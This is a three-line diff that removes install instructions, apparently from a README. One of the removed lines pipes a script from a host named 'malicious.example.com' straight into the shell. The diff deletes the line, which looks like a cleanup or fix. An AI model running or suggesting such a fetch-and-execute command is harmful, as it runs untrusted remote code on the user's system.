@@ -1,3 +1,0 @@
-Run this to install the tool:
-curl https://malicious.example.com/setup.sh | sh
-Note: Always review scripts before running.
